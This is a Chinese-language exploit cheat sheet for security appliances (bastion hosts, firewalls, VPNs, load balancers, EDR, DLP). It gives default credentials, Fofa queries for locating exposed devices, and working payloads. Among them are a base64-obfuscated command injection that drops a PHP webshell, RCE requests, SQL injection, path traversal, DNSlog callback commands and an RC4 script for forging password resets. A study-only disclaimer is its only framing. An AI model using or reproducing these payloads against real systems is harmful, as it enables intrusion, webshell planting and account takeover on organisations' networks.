# SecDevice - Exploits

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

# 大纲

* **身份与访问控制**
    * [堡垒机](#堡垒机)

* **网络检测与响应**
    * [IDS](#ids)
    * [网络防火墙](#网络防火墙)
    * [WAF](#waf)
    * [网关](#网关)
    * [负载均衡](#负载均衡)
    * [VPN](#vpn)

* **终端响应与检测**
    * [杀软](#杀软)
    * [EDR](#edr)
    * [数据防泄漏系统](#数据防泄漏系统)

---

# 身份与访问控制

## 堡垒机

**齐治堡垒机**

> Fofa: app="齐治科技-堡垒机"

- **默认口令**
    - shterm/shterm

- **齐治堡垒机 ShtermClient-2.1.1 命令执行漏洞**
    - [齐治堡垒机ShtermClient-2.1.1命令执行漏洞（CNVD-2019-09593）分析](https://www.cnblogs.com/StudyCat/p/11201725.html)
        ```
        http://10.20.10.11/listener/cluster_manage.php
        https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}" ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64${IFS}- d|bash`|${IFS}|echo${IFS}
        /var/www/shterm/resources/qrcode/lbj77.php  密码10086
        ```

- **CNVD-2019-20835 齐治堡垒机前台远程命令执行漏洞**
    - [齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）分析](https://www.cnblogs.com/StudyCat/p/11256944.html)

- **CNVD-2019-17294 齐治堡垒机后台存在命令执行漏洞**
    - [齐治堡垒机后台存在命令执行漏洞（CNVD-2019-17294）分析](https://www.cnblogs.com/StudyCat/p/11197986.html)

- **远程代码执行**
    - POC | Payload | exp
        ```
        POST /shterm/listener/tui_update.php

        a=["t';import os;os.popen('whoami')#"]
        ```

- **任意用户登录漏洞**
    - POC | Payload | exp
        ```
        /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
        ```

**H3C SecParh**

> Fofa: app="H3C-SecPath-运维审计系统" && body="2018"

- **get_detail_view.php 任意用户登录漏洞**
    - POC | Payload | exp
        ```
        /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
        ```

---

# 网络检测与响应

## 蜜罐

**相关文章**
- [【格物实验室】浅谈物联网蜜罐识别方法](http://blog.nsfocus.net/iot-honeypot-1111/)
- [红队遇蜜罐 莫慌](https://mp.weixin.qq.com/s/YBge1xjpjQjQ-NoK4kK6RQ)
- [浅谈Mysql蜜罐识别](https://mp.weixin.qq.com/s/f30RvhYlB97dXnjzv4_H_Q)
- [浅析开源蜜罐识别与全网测绘](https://mp.weixin.qq.com/s/ll-vIoPhBMxYVTKm3UJ8lQ)
- [蜜罐建设的一些思考](https://mp.weixin.qq.com/s/_hpJP6bTuoH-3cQtDawGOw)

**相关工具**
- [BeichenDream/WhetherMysqlSham](https://github.com/BeichenDream/WhetherMysqlSham) - 检测目标 Mysql 数据库是不是蜜罐,获取目标数据库详细信息
- [Monyer/antiHoneypot](https://github.com/Monyer/antiHoneypot) - 一个拦截蜜罐 XSSI 的 Chrome 扩展

**从蓝队溯源角度出发**
- 分析样本
    - PC 名称
    - 语言
    - 常用函数、方法
    - 注释习惯、变量名习惯
- 前端漏洞反制
    - 浏览器记录、书签、cookie 等
    - 验证码、手机号、邮箱
    - 攻击时间段
- 后渗透反制
    - 钓鱼文件
    - ntlm中继
    - Rogue MySql Server

**从红队角度出发**
- 前台
    - 不支持正常浏览器，仅老版 IE
    - 仅支持老版本 flash
    - 不正常的 JS 文件，js 混淆
    - 仅 json 文件, 内含指纹
    - XSS、JSONP
    - 大量网络请求
    - 同站同 CMS 不同页面不同时间、CMS 版本
    - 任意口令登录?
    - 要求实名认证、或手机号注册
- 后渗透
    - 第二次登录后发现 history 记录全部清空
    - 开放了大量端口
    - docker 容器且无正常业务数据
    - 例如 cat /proc/meminfo 这个命令无论执行多少次得到的内容都是不变的，而这真实的系统中是不可能的。

## IDS

**文章**
- [IDS逃避技术和对策](https://www.oschina.net/question/12_6140)
- [网络层绕过IDS/IPS的一些探索](https://security.tencent.com/index.php/blog/msg/147)

**绿盟 UTS 综合威胁探针**
- **管理员任意登录**
    - POC | Payload | exp
        - [绿盟UTS综合威胁探针管理员任意登录](https://www.hedysx.com/2612.html)
        - [【干货】绿盟UTS综合威胁探针管理员任意登录](https://www.hackbug.net/archives/112.html)

---

## 网络防火墙

**Cisco ASA**
- **CVE-2018-0296 Cisco ASA Directory Traversal**
    - POC | Payload | exp
        - [yassineaboukir/CVE-2018-0296](https://github.com/yassineaboukir/CVE-2018-0296)

- **CVE-2020-3452**
    - POC | Payload | exp
        ```
        /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
        ```

**网康下一代防火墙**

>  fofa: app="网康科技-下一代防火墙"

- **网康下一代防火墙 RCE**
    - POC | Payload | exp
        ```
        POST /directdata/direct/router HTTP/1.1
        Host: x.x.x.x
        Connection: close
        Cache-Control: max-age=0
        sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
        sec-ch-ua-mobile: ?0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: cross-site
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Referer: https://x.x.x.x/
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: PHPSESSID=d6o8gdugrhmvf2sq18ojhj50p3; ys-active_page=s%3A
        Content-Length: 178

        {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test_test.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
        ```
        ```
        访问：https://x.x.x.x/test_test.txt
        ```

**启明星辰 天清汉马USG防火墙**
- **弱口令**
    ```
    账号：useradmin
    密码：venus.user
    ```

- **逻辑缺陷漏洞**
    ```
    登陆后,后台可直接修改任意用户权限
    ```

**佑友防火墙**
- **默认账号密码**
    ```
    User: admin
    Pass: hicomadmin
    ```

- **后台命令执行漏洞**
    ```
    系统管理 --> 维护工具 --> Ping
    127.0.0.1|cat /etc/passwd
    ```

---

## WAF

**Sophos XG**
- **CVE-2020-12271 && CVE-2020-15504**
    - 相关文章
        - [Sophos XG - A Tale of the Unfortunate Re-engineering of an N-Day and the Lucky Find of a 0-Day](https://codewhitesec.blogspot.com/2020/07/sophos-xg-tale-of-unfortunate-re.html)

**绿盟 waf 封禁绕过s**
- XFF伪造字段地址为127.0.0.1，导致waf上看不见攻击者地址

---

## 网关

**上海格尔安全认证网关管理系统**
- [上海格尔安全认证网关管理系统命令执行漏洞大礼包](https://php.mengsec.com/bugs/wooyun-2016-0170003.html)
- [上海格尔软件安全认证网关命令执行漏洞（无需登录）](https://php.mengsec.com/bugs/wooyun-2016-0169715.html)
- [上海格尔软件安全认证网关命令执行漏洞（可批量getshell）](https://php.mengsec.com/bugs/wooyun-2016-0170010.html)

**网康 NS-ASG 安全网关**

> Fofa : 网康 NS-ASG 安全网关

- **任意文件读取漏洞**
    - POC | Payload | exp
        ```
        /admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd
        ```

---

## 负载均衡

**Citrix ADC**
- **CVE-2019-19781 Citrix Gateway/ADC 远程代码执行漏洞**
    - 文章
        - [Citrix Gateway/ADC 远程代码执行漏洞分析](https://www.freebuf.com/news/232752.html)

    - POC | Payload | exp
        - [trustedsec/cve-2019-19781](https://github.com/trustedsec/cve-2019-19781)

**F5 BIG-IP ADC**
- **CVE-2020-5902 F5 BIG-IP 远程代码执行漏洞**
    - 文章
        - [CVE-2020-5902——关于;号绕过认证技巧总结](https://mp.weixin.qq.com/s/JnI4f3R5JZqhLFv_fTQ_0A)
        - [F5 BIG-IP Remote Code Execution Exploit - CVE-2020-5902 | Critical Start](https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/)

    - POC | Payload | exp
        - [jas502n/CVE-2020-5902](https://github.com/jas502n/CVE-2020-5902)
        - [theLSA/f5-bigip-rce-cve-2020-5902](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902)

**天融信 Top-app LB**
- **SQL注入漏洞**
    - POC | Payload | exp
        - [天融信Top-app LB负载均衡SQL注入漏洞](https://www.hedysx.com/2601.html)
            ```
            POST /acc/clsf/report/datasource.php HTTP/1.1
            Host:
            Connection: close
            Accept: text/javascript, text/html, application/xml, text/xml, */*
            X-Prototype-Version: 1.6.0.3
            X-Requested-With: XMLHttpRequest
            User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
            Sec-Fetch-Site: same-origin
            Sec-Fetch-Mode: cors
            Sec-Fetch-Dest: empty
            Accept-Encoding: gzip, deflate
            Accept-Language: zh-CN,zh;q=0.9
            Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57
            Content-Type: application/x-www-form-urlencoded
            Content-Length: 201

            t=l&e=0&s=t&l=1&vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22-- &o=r_Speed&gid=0&lmt=10&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=
            ```
- **未授权**
    - POC | Payload | exp
        - [天融信负载均衡TopApp-LB系统无需密码直接登录](https://www.uedbox.com/post/21626/)
            ```
            登录框
            ; ping xxx.dnslog.info; echo
            ```

- **RCE**
    - POC | Payload | exp
        - [天融信TopApp-LB负载均衡命令执行漏洞大量设备可被通杀](https://www.uedbox.com/post/22193/)
            ```
            用户名随意  密码：;id
            ```

---

## VPN

**Fortigate SSL VPN**
- **CVE-2018-13379 Fortigate SSL VPN 密码读取**
    - [milo2012/CVE-2018-13379](https://github.com/milo2012/CVE-2018-13379)
- **CVE-2018-13382 Fortigate SSL VPN 任意密码重置**
    - [milo2012/CVE-2018-13382](https://github.com/milo2012/CVE-2018-13382)

**Palo_Alto SSL VPN**
- **CVE-2019-1579 Palo Alto GlobalProtect 远程代码执行漏洞**
    - 文章
        - [Orange: Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!](https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html)
        - [Palo Alto GlobalProtect上的PreAuth RCE](https://www.cnblogs.com/backlion/p/11209054.html)

    - POC | Payload | exp
        - [securifera/CVE-2019-1579](https://github.com/securifera/CVE-2019-1579)

**Pulse_Secure SSL VPN**
- **CVE-2019-11510 Pulse Secure SSL VPN 任意文件读取漏洞**
    - 文章
        - [Pulse Secure 任意文件读取（CVE-2019-11510）漏洞](https://www.cnblogs.com/StudyCat/p/11440991.html)

    - POC | Payload | exp
        - [projectzeroindia/CVE-2019-11510](https://github.com/projectzeroindia/CVE-2019-11510)

- **CVE-2019-11539 Pulse Secure SSL VPN 远程代码执行漏洞**
    - [0xDezzy/CVE-2019-11539](https://github.com/0xDezzy/CVE-2019-11539)

**深信服 VPN**
- **口令爆破**
    - POC | Payload | exp
        - https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=20633
            ```
            用户登录，若多次尝试登录失败会要求输入验证码，若输入错误的验证码，会提示“校验码错误或校验码已过期”；修改登录请求的数据包，清空cookie和验证码字段的值即可绕过验证码，此时提示“用户名或密码错误”。
            /por/login_auth.csp?apiversion=1sangfor/cgi-bin/login.cgi?rnd=
            ```

- **短信绕过**
    - POC | Payload | exp
        ```
        POST https://路径/por/changetelnum.csp?apiversion=1

        newtel=TARGET_PHONE&sessReq=clusterd&username=TARGET_USERNAME&grpid=0&sessid=0&ip=127.0.0.1
        ```

- **任意密码重置**
    - POC | Payload | exp
        ```
        某VPN加密算法使用了默认的key,攻击者构利用key构造重置密码数据包从而修改任意用户的密码
        利用:需要登录账号

        M7.6.6R1版本key为20181118

        M7.6.1key为20100720

        POST /por/changepwd.csp

        sessReq=clusterd&sessid=0&str=RC4_STR&len=RC4_STR_LEN(脚本计算后结果)
        ```
        ```py
        from Crypto.Cipher import ARC4
        from binascii import a2b_hex

        def myRC4(data, key):
            rc41= ARC4.new(key)
            encrypted =rc41.encrypt(data)
            return encrypted. encode('hex')

        def rc4_decrpt_hex(data, key):
            rc41= ARC4. new(key)
            return rc41. decrypt(a2b_hex(data))

        key= '20100720'
        data = r',username-TARGET_USERNAME, ip-127.0.0.1,grpid-1, pripsw-suiyi , newpsw=TARGET PASSWORD,'
        print myRC4(data, key)
        ```

- **RCE**
    - POC | Payload | exp
        ```
        https://x.com/por/checkurl.csp?url=-h|curl `whoami`.xxxx.dnslog.cn&retry=1&timeout=1
        ```

**锐捷 SSL VPN**
- **锐捷 SSL VPN 越权访问漏洞**
    - FOFA: icon_hash="884334722" || title="Ruijie SSL VPN"
    - 相关文章
        - [锐捷SSL VPN 越权访问漏洞](https://mp.weixin.qq.com/s/acU0CNhyNkKl99o1Iv3N-w)
    - POC | Payload | exp
        ```
        GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1
        Host: xxx.xxx.xxx.xxx
        Connection: close
        Pragma: no-cache
        Cache-Control: no-cache
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Cookie: UserName=admin; SessionId=1; FirstVist=1; Skin=1; tunnel=1
        ```
        UserName 参数为已知用户名

---

# 终端响应与检测

**相关文章**
- [绕过集中管控类安全软件小技巧](https://www.t00ls.net/articles-58584.html)

## 杀软

**利用杀毒软件删除任意文件**
- 相关文章
    - [Exploiting (Almost) Every Antivirus Software](https://www.rack911labs.com/research/exploiting-almost-every-antivirus-software/)
        - [利用杀毒软件删除任意文件](https://idiotc4t.com/defense-evasion/using-antivirus-to-delete-files)

**白名单信任文件**
- 相关文章
    - [通过信任文件绕过火绒](https://mp.weixin.qq.com/s/mw8Sql8VtGfNGQkFxptWnQ)

## EDR

**深信服 EDR**
- **2020.08命令执行**
    - 相关文章
        - [深信服终端检测响应平台 EDR 代码审计](https://www.sqlsec.com/2020/08/edr.html)
    - POC | Payload | exp
        - [A2gel/sangfor-edr-exploit](https://github.com/A2gel/sangfor-edr-exploit)

- **2020.09命令执行**
    - POC | Payload | exp
        ```
        POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
        {"params":"w=123\"'1234123'\"|命令"}
        ```

**360天擎**

> Fofa: title="360天擎"

- **前台SQL注入**
    - POC | Payload | exp
        ```
        /api/dp/rptsvcsyncpoint?ccid=1
        ```

- **数据库信息泄露漏洞**
    - POC | Payload | exp
        ```
        http://x.x.x.x/api/dbstat/gettablessize
        ```

---

## 数据防泄漏系统

**天融信数据防泄漏系统**
- **越权修改管理员密码**
    ```
    无需登录权限,由于修改密码处未校验原密码,且 /?module=auth_user&action=mod_edit_pwd 接口未授权访问,造成直接修改任意用户密码。 默认 superman 账户 uid 为 1。

    POST /?module=auth_user&action=mod_edit_pwd

    Cookie: username=superman;
    uid=1&pd=Newpasswd&mod_pwd=1&dlp_perm=1
    ```
